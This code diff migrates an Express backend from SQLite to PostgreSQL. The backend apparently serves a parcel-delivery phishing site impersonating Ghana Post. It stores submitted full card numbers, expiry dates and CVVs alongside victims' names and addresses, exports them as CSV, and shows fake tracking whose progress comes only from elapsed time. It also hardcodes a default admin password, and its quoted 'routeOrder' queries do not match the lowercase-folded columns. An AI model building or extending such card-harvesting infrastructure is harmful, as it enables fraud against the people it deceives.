@@ -1,6 +1,6 @@
 
 const express = require('express');
-const sqlite3 = require('sqlite3').verbose();
+const { Pool } = require('pg');
 const bcrypt = require('bcryptjs');
 const cors = require('cors');
 const jwt = require('jsonwebtoken');
@@ -17,108 +17,120 @@ const JWT_SECRET = process.env.JWT_SECRET || 'your-super-secret-key-for-jwt-toke
 const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
 const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'ghanapost2024';
 
-// Database setup
-const db = new sqlite3.Database('./submissions.db', (err) => {
-    if (err) {
-        console.error(err.message);
-    }
-    console.log('Connected to the submissions database.');
+// Database setup for PostgreSQL
+const pool = new Pool({
+    connectionString: process.env.DATABASE_URL,
+    ssl: process.env.NODE_ENV === 'production' ? { rejectUnauthorized: false } : false,
 });
 
-// Create submissions table
-db.run(`CREATE TABLE IF NOT EXISTS submissions (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    packageNumber TEXT,
-    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-    fullName TEXT,
-    phoneNumber TEXT,
-    email TEXT,
-    streetAddress TEXT,
-    city TEXT,
-    region TEXT,
-    postalCode TEXT,
-    country TEXT,
-    cardholderName TEXT,
-    cardNumber TEXT,
-    expiryDate TEXT,
-    cvv TEXT,
-    status TEXT DEFAULT 'pending',
-    ipAddress TEXT,
-    userAgent TEXT
-)`);
+console.log('Connecting to PostgreSQL database...');
 
-// Create contacts table
-db.run(`CREATE TABLE IF NOT EXISTS contacts (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
-    name TEXT,
-    email TEXT,
-    phone TEXT,
-    subject TEXT,
-    message TEXT,
-    department TEXT,
-    status TEXT DEFAULT 'new'
-)`);
+// Function to initialize database tables
+const initializeDatabase = async () => {
+    try {
+        // Create submissions table
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS submissions (
+                id SERIAL PRIMARY KEY,
+                packageNumber TEXT,
+                timestamp TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
+                fullName TEXT,
+                phoneNumber TEXT,
+                email TEXT,
+                streetAddress TEXT,
+                city TEXT,
+                region TEXT,
+                postalCode TEXT,
+                country TEXT,
+                cardholderName TEXT,
+                cardNumber TEXT,
+                expiryDate TEXT,
+                cvv TEXT,
+                status TEXT DEFAULT 'pending',
+                ipAddress TEXT,
+                userAgent TEXT
+            )
+        `);
 
-// Create tracking codes table
-db.run(`CREATE TABLE IF NOT EXISTS tracking_codes (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    trackingCode TEXT UNIQUE NOT NULL,
-    createdAt DATETIME DEFAULT CURRENT_TIMESTAMP,
-    currentLocation TEXT DEFAULT 'China - Processing',
-    currentStatus TEXT DEFAULT 'Order Placed',
-    estimatedDelivery DATE,
-    daysToDelivery INTEGER DEFAULT 60,
-    description TEXT,
-    status TEXT DEFAULT 'active',
-    customerFullName TEXT,
-    customerPhone TEXT,
-    customerEmail TEXT,
-    customerAddress TEXT,
-    customerCity TEXT,
-    customerRegion TEXT,
-    customerPostalCode TEXT,
-    customerCountry TEXT
-)`);
+        // Create contacts table
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS contacts (
+                id SERIAL PRIMARY KEY,
+                timestamp TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
+                name TEXT,
+                email TEXT,
+                phone TEXT,
+                subject TEXT,
+                message TEXT,
+                department TEXT,
+                status TEXT DEFAULT 'new'
+            )
+        `);
 
-// Create tracking route locations table (predefined route from China to Ghana)
-db.run(`CREATE TABLE IF NOT EXISTS route_locations (
-    id INTEGER PRIMARY KEY AUTOINCREMENT,
-    routeOrder INTEGER,
-    location TEXT UNIQUE,
-    country TEXT,
-    description TEXT
-)`, (err) => {
-    if (err) {
-        console.error('Error creating route_locations table:', err.message);
-        return;
+        // Create tracking codes table
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS tracking_codes (
+                id SERIAL PRIMARY KEY,
+                trackingCode TEXT UNIQUE NOT NULL,
+                createdAt TIMESTAMPTZ DEFAULT CURRENT_TIMESTAMP,
+                currentLocation TEXT DEFAULT 'China - Processing',
+                currentStatus TEXT DEFAULT 'Order Placed',
+                estimatedDelivery DATE,
+                daysToDelivery INTEGER DEFAULT 60,
+                description TEXT,
+                status TEXT DEFAULT 'active',
+                customerFullName TEXT,
+                customerPhone TEXT,
+                customerEmail TEXT,
+                customerAddress TEXT,
+                customerCity TEXT,
+                customerRegion TEXT,
+                customerPostalCode TEXT,
+                customerCountry TEXT
+            )
+        `);
+
+        // Create tracking route locations table
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS route_locations (
+                id SERIAL PRIMARY KEY,
+                routeOrder INTEGER,
+                location TEXT UNIQUE,
+                country TEXT,
+                description TEXT
+            )
+        `);
+
+        // Insert default route locations if they don't exist
+        const defaultLocations = [
+            { order: 1, location: 'Shenzhen, China', country: 'China', desc: 'Order Processing & Packing' },
+            { order: 2, location: 'Shanghai Port, China', country: 'China', desc: 'Port of Departure' },
+            { order: 3, location: 'South China Sea', country: 'International Waters', desc: 'In Transit' },
+            { order: 4, location: 'Suez Canal, Egypt', country: 'Egypt', desc: 'Port Transit' },
+            { order: 5, location: 'Arabian Sea', country: 'International Waters', desc: 'In Transit' },
+            { order: 6, location: 'Tema Port, Ghana', country: 'Ghana', desc: 'Port of Arrival' },
+            { order: 7, location: 'Accra Customs', country: 'Ghana', desc: 'Customs Clearance' },
+            { order: 8, location: 'Ghana Post Hub', country: 'Ghana', desc: 'Sorting & Distribution' },
+            { order: 9, location: 'Local Delivery Station', country: 'Ghana', desc: 'Ready for Delivery' }
+        ];
+
+        const insertQuery = 'INSERT INTO route_locations (routeOrder, location, country, description) VALUES ($1, $2, $3, $4) ON CONFLICT (location) DO NOTHING';
+        for (const loc of defaultLocations) {
+            await pool.query(insertQuery, [loc.order, loc.location, loc.country, loc.desc]);
+        }
+
+        console.log('Database tables are ready.');
+    } catch (err) {
+        console.error('Error initializing database:', err.message, err.stack);
     }
+};
 
-    // Insert default route locations if not exists — only after table is ready
-    const defaultLocations = [
-        { order: 1, location: 'Shenzhen, China', country: 'China', desc: 'Order Processing & Packing' },
-        { order: 2, location: 'Shanghai Port, China', country: 'China', desc: 'Port of Departure' },
-        { order: 3, location: 'South China Sea', country: 'International Waters', desc: 'In Transit' },
-        { order: 4, location: 'Suez Canal, Egypt', country: 'Egypt', desc: 'Port Transit' },
-        { order: 5, location: 'Arabian Sea', country: 'International Waters', desc: 'In Transit' },
-        { order: 6, location: 'Tema Port, Ghana', country: 'Ghana', desc: 'Port of Arrival' },
-        { order: 7, location: 'Accra Customs', country: 'Ghana', desc: 'Customs Clearance' },
-        { order: 8, location: 'Ghana Post Hub', country: 'Ghana', desc: 'Sorting & Distribution' },
-        { order: 9, location: 'Local Delivery Station', country: 'Ghana', desc: 'Ready for Delivery' }
-    ];
-
-    const insertStmt = db.prepare(`INSERT OR IGNORE INTO route_locations (routeOrder, location, country, description) VALUES (?, ?, ?, ?)`);
-    defaultLocations.forEach(loc => {
-        insertStmt.run([loc.order, loc.location, loc.country, loc.desc]);
-    });
-    insertStmt.finalize();
-});
 
 // Middleware to verify JWT
 const authenticateToken = (req, res, next) => {
     const authHeader = req.headers['authorization'];
     const token = authHeader && authHeader.split(' ')[1];
-    if (token == null) return res.sendStatus(401); 
+    if (token == null) return res.sendStatus(401);
 
     jwt.verify(token, JWT_SECRET, (err, user) => {
         if (err) return res.sendStatus(403);
@@ -130,7 +142,7 @@ const authenticateToken = (req, res, next) => {
 // --- API Endpoints ---
 
 // POST /api/submissions - Save user data
-app.post('/api/submissions', (req, res) => {
+app.post('/api/submissions', async (req, res) => {
     const {
         packageNumber, fullName, phoneNumber, email, streetAddress, city, region,
         postalCode, country, cardholderName, cardNumber, expiryDate, cvv
@@ -141,27 +153,27 @@ app.post('/api/submissions', (req, res) => {
     const sql = `INSERT INTO submissions (
         packageNumber, fullName, phoneNumber, email, streetAddress, city, region,
         postalCode, country, cardholderName, cardNumber, expiryDate, cvv, ipAddress, userAgent
-    ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`;
+    ) VALUES ($1, $2, $3, $4, $5, $6, $7, $8, $9, $10, $11, $12, $13, $14, $15) RETURNING id`;
 
     const params = [
         packageNumber, fullName, phoneNumber, email, streetAddress, city, region,
         postalCode, country, cardholderName, cardNumber, expiryDate, cvv, ipAddress, userAgent
     ];
 
-    db.run(sql, params, function(err) {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
+    try {
+        const result = await pool.query(sql, params);
         res.json({
             "message": "success",
-            "data": { id: this.lastID, ...req.body },
+            "data": { id: result.rows[0].id, ...req.body },
         });
-    });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // POST /api/contact - Save contact form submission
-app.post('/api/contact', (req, res) => {
+app.post('/api/contact', async (req, res) => {
     const { name, email, phone, subject, message, department } = req.body;
 
     if (!name || !email || !subject || !message) {
@@ -169,90 +181,89 @@ app.post('/api/contact', (req, res) => {
     }
 
     const sql = `INSERT INTO contacts (name, email, phone, subject, message, department)
-                 VALUES (?, ?, ?, ?, ?, ?)`;
+                 VALUES ($1, $2, $3, $4, $5, $6) RETURNING id`;
 
     const params = [name, email, phone || null, subject, message, department || 'general'];
 
-    db.run(sql, params, function(err) {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
+    try {
+        const result = await pool.query(sql, params);
         res.json({
             "message": "Contact message received successfully",
-            "data": { id: this.lastID, ...req.body }
+            "data": { id: result.rows[0].id, ...req.body }
         });
-    });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // GET /api/submissions - Get all submissions (admin only)
-app.get('/api/submissions', authenticateToken, (req, res) => {
+app.get('/api/submissions', authenticateToken, async (req, res) => {
     const sql = "SELECT * FROM submissions ORDER BY timestamp DESC";
-    db.all(sql, [], (err, rows) => {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
+    try {
+        const result = await pool.query(sql);
         res.json({
             "message": "success",
-            "data": rows
+            "data": result.rows
         });
-    });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // GET /api/submissions/:id - Get single submission (admin only)
-app.get('/api/submissions/:id', authenticateToken, (req, res) => {
-    const sql = "SELECT * FROM submissions WHERE id = ?";
-    db.get(sql, [req.params.id], (err, row) => {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
+app.get('/api/submissions/:id', authenticateToken, async (req, res) => {
+    const sql = "SELECT * FROM submissions WHERE id = $1";
+    try {
+        const result = await pool.query(sql, [req.params.id]);
         res.json({
             "message": "success",
-            "data": row
+            "data": result.rows[0] || null
         });
-    });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // DELETE /api/submissions/:id - Delete a submission (admin only)
-app.delete('/api/submissions/:id', authenticateToken, (req, res) => {
-    const sql = "DELETE FROM submissions WHERE id = ?";
-    db.run(sql, [req.params.id], function(err) {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
-        res.json({ "message": "deleted", "changes": this.changes });
-    });
+app.delete('/api/submissions/:id', authenticateToken, async (req, res) => {
+    const sql = "DELETE FROM submissions WHERE id = $1";
+    try {
+        const result = await pool.query(sql, [req.params.id]);
+        res.json({ "message": "deleted", "changes": result.rowCount });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // PATCH /api/submissions/:id/status - Update submission status (admin only)
-app.patch('/api/submissions/:id/status', authenticateToken, (req, res) => {
+app.patch('/api/submissions/:id/status', authenticateToken, async (req, res) => {
     const { status } = req.body;
     if (!['pending', 'completed', 'flagged'].includes(status)) {
         return res.status(400).json({ "error": "Invalid status" });
     }
-    const sql = "UPDATE submissions SET status = ? WHERE id = ?";
-    db.run(sql, [status, req.params.id], function(err) {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
-        res.json({ "message": "status updated", "changes": this.changes });
-    });
+    const sql = "UPDATE submissions SET status = $1 WHERE id = $2";
+    try {
+        const result = await pool.query(sql, [status, req.params.id]);
+        res.json({ "message": "status updated", "changes": result.rowCount });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 
 // POST /api/admin/login - Admin authentication
 app.post('/api/admin/login', (req, res) => {
     const { username, password } = req.body;
-    
-    // Simple validation
+
     if (!username || !password) {
         return res.status(400).json({ "error": "Username and password required" });
     }
-    
+
     if (username === ADMIN_USERNAME && password === ADMIN_PASSWORD) {
         const accessToken = jwt.sign({ username: username }, JWT_SECRET, { expiresIn: '24h' });
         res.json({ accessToken: accessToken, message: "Login successful" });
@@ -262,292 +273,290 @@ app.post('/api/admin/login', (req, res) => {
 });
 
 // GET /api/contacts - Get all contact messages (admin only)
-app.get('/api/contacts', authenticateToken, (req, res) => {
+app.get('/api/contacts', authenticateToken, async (req, res) => {
     const sql = "SELECT * FROM contacts ORDER BY timestamp DESC";
-    db.all(sql, [], (err, rows) => {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
+    try {
+        const result = await pool.query(sql);
         res.json({
             "message": "success",
-            "data": rows
+            "data": result.rows
         });
-    });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // PATCH /api/contacts/:id/status - Mark contact as read (admin only)
-app.patch('/api/contacts/:id/status', authenticateToken, (req, res) => {
+app.patch('/api/contacts/:id/status', authenticateToken, async (req, res) => {
     const { status } = req.body;
-    const sql = "UPDATE contacts SET status = ? WHERE id = ?";
-    db.run(sql, [status || 'read', req.params.id], function(err) {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
-        res.json({ "message": "status updated", "changes": this.changes });
-    });
+    const sql = "UPDATE contacts SET status = $1 WHERE id = $2";
+    try {
+        const result = await pool.query(sql, [status || 'read', req.params.id]);
+        res.json({ "message": "status updated", "changes": result.rowCount });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // GET /api/submissions/search - Search submissions (admin only)
-app.get('/api/submissions/search', authenticateToken, (req, res) => {
+app.get('/api/submissions/search', authenticateToken, async (req, res) => {
     const { query, startDate, endDate } = req.query;
     let sql = "SELECT * FROM submissions WHERE 1=1";
     const params = [];
-    
+    let paramIndex = 1;
+
     if (query) {
-        sql += " AND (fullName LIKE ? OR email LIKE ? OR phoneNumber LIKE ? OR packageNumber LIKE ?)";
+        sql += ` AND (fullName ILIKE $${paramIndex++} OR email ILIKE $${paramIndex++} OR phoneNumber ILIKE $${paramIndex++} OR packageNumber ILIKE $${paramIndex++})`;
         const searchTerm = `%${query}%`;
         params.push(searchTerm, searchTerm, searchTerm, searchTerm);
     }
-    
+
     if (startDate) {
-        sql += " AND timestamp >= ?";
+        sql += ` AND timestamp >= $${paramIndex++}`;
         params.push(startDate);
     }
-    
+
     if (endDate) {
-        sql += " AND timestamp <= ?";
+        sql += ` AND timestamp <= $${paramIndex++}`;
         params.push(endDate);
     }
-    
+
     sql += " ORDER BY timestamp DESC";
-    
-    db.all(sql, params, (err, rows) => {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
-        res.json({ "message": "success", "data": rows });
-    });
+
+    try {
+        const result = await pool.query(sql, params);
+        res.json({ "message": "success", "data": result.rows });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // GET /api/submissions/export/csv - Export submissions as CSV (admin only)
-app.get('/api/submissions/export/csv', authenticateToken, (req, res) => {
+app.get('/api/submissions/export/csv', authenticateToken, async (req, res) => {
     const sql = "SELECT * FROM submissions ORDER BY timestamp DESC";
-    db.all(sql, [], (err, rows) => {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
+    try {
+        const { rows } = await pool.query(sql);
         
         if (rows.length === 0) {
-            return res.json({ csv: "" });
+            res.setHeader('Content-Type', 'text/csv');
+            res.setHeader('Content-Disposition', 'attachment; filename=submissions.csv');
+            return res.send("");
         }
-        
-        // Create CSV header
+
         const headers = Object.keys(rows[0]);
         const csvContent = [
             headers.join(','),
-            ...rows.map(row => 
+            ...rows.map(row =>
                 headers.map(header => {
                     const value = row[header];
-                    // Escape quotes and wrap in quotes if contains comma
-                    if (value && (value.toString().includes(',') || value.toString().includes('"'))) {
-                        return `"${value.toString().replace(/"/g, '""')}"`;
+                    if (value === null || value === undefined) {
+                        return '';
                     }
-                    return value || '';
+                    const strValue = String(value);
+                    if (strValue.includes(',') || strValue.includes('"') || strValue.includes('\n')) {
+                        return `"${strValue.replace(/"/g, '""')}"`;
+                    }
+                    return strValue;
                 }).join(',')
             )
         ].join('\n');
-        
+
         res.setHeader('Content-Type', 'text/csv');
         res.setHeader('Content-Disposition', 'attachment; filename=submissions.csv');
         res.send(csvContent);
-    });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
+
 
 // --- TRACKING CODE ENDPOINTS ---
 
 // GET /api/tracking/routes - Get all available route locations
-app.get('/api/tracking/routes', (req, res) => {
-    const sql = "SELECT * FROM route_locations ORDER BY routeOrder ASC";
-    db.all(sql, [], (err, rows) => {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
-        res.json({ "message": "success", "data": rows });
-    });
+app.get('/api/tracking/routes', async (req, res) => {
+    const sql = "SELECT * FROM route_locations ORDER BY \"routeOrder\" ASC";
+    try {
+        const result = await pool.query(sql);
+        res.json({ "message": "success", "data": result.rows });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // POST /api/tracking/generate - Generate new tracking code (admin only)
-app.post('/api/tracking/generate', authenticateToken, (req, res) => {
+app.post('/api/tracking/generate', authenticateToken, async (req, res) => {
     const { description, daysToDelivery, location } = req.body;
-    
-    // Generate unique tracking code: GH-PKG-YYYY-XXXXXX
+
     const year = new Date().getFullYear();
     const randomNum = Math.floor(Math.random() * 1000000).toString().padStart(6, '0');
     const trackingCode = `GH-PKG-${year}-${randomNum}`;
-    
-    // Use provided location if present, otherwise fallback to previous default
+
     const startingLocation = location || 'Shenzhen, China';
     const sql = `INSERT INTO tracking_codes (trackingCode, currentLocation, currentStatus, daysToDelivery, description)
-                 VALUES (?, ?, ?, ?, ?)`;
+                 VALUES ($1, $2, $3, $4, $5) RETURNING id`;
     const params = [trackingCode, startingLocation, 'Order Placed', daysToDelivery || 60, description || ''];
-    
-    db.run(sql, params, function(err) {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
+
+    try {
+        const result = await pool.query(sql, params);
         res.json({
             "message": "Tracking code generated successfully",
             "data": {
-                id: this.lastID,
+                id: result.rows[0].id,
                 trackingCode,
                 currentLocation: startingLocation,
                 currentStatus: 'Order Placed',
                 daysToDelivery: daysToDelivery || 60
             }
         });
-    });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // GET /api/tracking/:code - Track package by code (public)
-app.get('/api/tracking/:code', (req, res) => {
-    const sql = "SELECT * FROM tracking_codes WHERE trackingCode = ?";
-    db.get(sql, [req.params.code], (err, row) => {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
+app.get('/api/tracking/:code', async (req, res) => {
+    const sql = "SELECT * FROM tracking_codes WHERE trackingCode = $1";
+    try {
+        const result = await pool.query(sql, [req.params.code]);
+        const row = result.rows[0];
+
         if (!row) {
-            res.status(404).json({ "error": "Tracking code not found" });
-            return;
+            return res.status(404).json({ "error": "Tracking code not found" });
         }
 
-        // Compute progress statelessly based on createdAt and daysToDelivery
-        const routeSql = "SELECT * FROM route_locations ORDER BY routeOrder ASC";
-        db.all(routeSql, [], (rErr, routes) => {
-            if (rErr) {
-                // still return the raw row if route lookup fails
-                return res.json({ "message": "success", "data": row });
+        const routeSql = 'SELECT * FROM route_locations ORDER BY "routeOrder" ASC';
+        const routesResult = await pool.query(routeSql);
+        const routes = routesResult.rows;
+
+        try {
+            const daysToDelivery = row.daystodelivery || 60;
+            const createdAt = row.createdat ? new Date(row.createdat) : new Date();
+            const now = new Date();
+            const elapsedMs = Math.max(0, now.getTime() - createdAt.getTime());
+            const elapsedDays = Math.floor(elapsedMs / (24 * 60 * 60 * 1000));
+            const computedDaysRemaining = Math.max(0, daysToDelivery - elapsedDays);
+
+            const n = routes.length || 1;
+            const fraction = daysToDelivery > 0 ? (elapsedDays / daysToDelivery) : 1;
+            let computedIndex = Math.min(n - 1, Math.floor(fraction * (n - 1)));
+            if (computedIndex < 0) computedIndex = 0;
+
+            let storedIndex = 0;
+            if (row.currentlocation) {
+                const si = routes.findIndex(r => r.location === row.currentlocation);
+                storedIndex = si >= 0 ? si : 0;
             }
 
-            try {
-                const daysToDelivery = row.daysToDelivery || 60;
-                const createdAt = row.createdAt ? new Date(row.createdAt) : new Date();
-                const now = new Date();
-                const elapsedMs = Math.max(0, now.getTime() - createdAt.getTime());
-                const elapsedDays = Math.floor(elapsedMs / (24 * 60 * 60 * 1000));
-                const computedDaysRemaining = Math.max(0, daysToDelivery - elapsedDays);
+            const chosenIndex = Math.max(storedIndex, computedIndex);
+            const computedLocation = routes[chosenIndex] ? routes[chosenIndex].location : row.currentlocation;
 
-                const n = routes.length || 1;
-                const fraction = daysToDelivery > 0 ? (elapsedDays / daysToDelivery) : 1;
-                let computedIndex = Math.min(n - 1, Math.floor(fraction * (n - 1)));
-                if (computedIndex < 0) computedIndex = 0;
+            const out = { ...row, computedDaysRemaining, computedIndex, computedLocation };
+            res.json({ "message": "success", "data": out });
 
-                // determine stored index for currentLocation
-                let storedIndex = 0;
-                if (row.currentLocation) {
-                    const si = routes.findIndex(r => r.location === row.currentLocation);
-                    storedIndex = si >= 0 ? si : 0;
-                }
+        } catch (e) {
+            console.error(e);
+            res.json({ "message": "success", "data": row });
+        }
 
-                // prefer whichever is further along (admin may have manually advanced)
-                const chosenIndex = Math.max(storedIndex, computedIndex);
-                const computedLocation = routes[chosenIndex] ? routes[chosenIndex].location : row.currentLocation;
-
-                const out = Object.assign({}, row, {
-                    computedDaysRemaining,
-                    computedIndex: chosenIndex,
-                    computedLocation,
-                });
-
-                res.json({ "message": "success", "data": out });
-            } catch (e) {
-                // fallback to raw row on error
-                res.json({ "message": "success", "data": row });
-            }
-        });
-    });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // POST /api/tracking/:code/customer - Save customer details to tracking code (public)
-app.post('/api/tracking/:code/customer', (req, res) => {
+app.post('/api/tracking/:code/customer', async (req, res) => {
     const { fullName, phoneNumber, email, streetAddress, city, region, postalCode, country } = req.body;
-    
-    // Update tracking code with customer details
+
     const sql = `UPDATE tracking_codes SET 
-                 customerFullName = ?, customerPhone = ?, customerEmail = ?,
-                 customerAddress = ?, customerCity = ?, customerRegion = ?, 
-                 customerPostalCode = ?, customerCountry = ?
-                 WHERE trackingCode = ?`;
-    
+                 customerFullName = $1, customerPhone = $2, customerEmail = $3,
+                 customerAddress = $4, customerCity = $5, customerRegion = $6, 
+                 customerPostalCode = $7, customerCountry = $8
+                 WHERE trackingCode = $9`;
+
     const params = [fullName, phoneNumber, email, streetAddress, city, region, postalCode, country, req.params.code];
-    
-    db.run(sql, params, function(err) {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
+
+    try {
+        const result = await pool.query(sql, params);
+        if (result.rowCount === 0) {
+            return res.status(404).json({ "error": "Tracking code not found" });
         }
-        if (this.changes === 0) {
-            res.status(404).json({ "error": "Tracking code not found" });
-            return;
-        }
-        res.json({ "message": "Customer details saved successfully", "changes": this.changes });
-    });
+        res.json({ "message": "Customer details saved successfully", "changes": result.rowCount });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // GET /api/tracking - Get all tracking codes (admin only)
-app.get('/api/tracking', authenticateToken, (req, res) => {
+app.get('/api/tracking', authenticateToken, async (req, res) => {
     const sql = "SELECT * FROM tracking_codes ORDER BY createdAt DESC";
-    db.all(sql, [], (err, rows) => {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
-        res.json({ "message": "success", "data": rows });
-    });
+    try {
+        const result = await pool.query(sql);
+        res.json({ "message": "success", "data": result.rows });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // PATCH /api/tracking/:id/location - Update tracking location (admin only)
-app.patch('/api/tracking/:id/location', authenticateToken, (req, res) => {
+app.patch('/api/tracking/:id/location', authenticateToken, async (req, res) => {
     const { currentLocation, currentStatus, daysToDelivery } = req.body;
     
-    let sql = "UPDATE tracking_codes SET ";
-    const params = [];
-    
+    let updates = [];
+    let params = [];
+    let paramIndex = 1;
+
     if (currentLocation) {
-        sql += "currentLocation = ?, ";
+        updates.push(`currentLocation = $${paramIndex++}`);
         params.push(currentLocation);
     }
     if (currentStatus) {
-        sql += "currentStatus = ?, ";
+        updates.push(`currentStatus = $${paramIndex++}`);
         params.push(currentStatus);
     }
     if (daysToDelivery !== undefined) {
-        sql += "daysToDelivery = ?, ";
+        updates.push(`daysToDelivery = $${paramIndex++}`);
         params.push(daysToDelivery);
     }
     
-    // Remove trailing comma and space
-    sql = sql.slice(0, -2) + " WHERE id = ?";
+    if (updates.length === 0) {
+        return res.status(400).json({ "error": "No fields to update" });
+    }
+
     params.push(req.params.id);
-    
-    db.run(sql, params, function(err) {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
-        res.json({ "message": "Tracking updated successfully", "changes": this.changes });
-    });
+    const sql = `UPDATE tracking_codes SET ${updates.join(', ')} WHERE id = $${paramIndex}`;
+
+    try {
+        const result = await pool.query(sql, params);
+        res.json({ "message": "Tracking updated successfully", "changes": result.rowCount });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 // DELETE /api/tracking/:id - Delete tracking code (admin only)
-app.delete('/api/tracking/:id', authenticateToken, (req, res) => {
-    const sql = "DELETE FROM tracking_codes WHERE id = ?";
-    db.run(sql, [req.params.id], function(err) {
-        if (err) {
-            res.status(400).json({ "error": err.message });
-            return;
-        }
-        res.json({ "message": "Tracking code deleted", "changes": this.changes });
-    });
+app.delete('/api/tracking/:id', authenticateToken, async (req, res) => {
+    const sql = "DELETE FROM tracking_codes WHERE id = $1";
+    try {
+        const result = await pool.query(sql, [req.params.id]);
+        res.json({ "message": "Tracking code deleted", "changes": result.rowCount });
+    } catch (err) {
+        console.error(err);
+        res.status(400).json({ "error": err.message });
+    }
 });
 
 const PORT = process.env.PORT || 5000;
-app.listen(PORT, () => {
+app.listen(PORT, async () => {
+    await initializeDatabase();
     console.log(`Server is running on port ${PORT}`);
 });
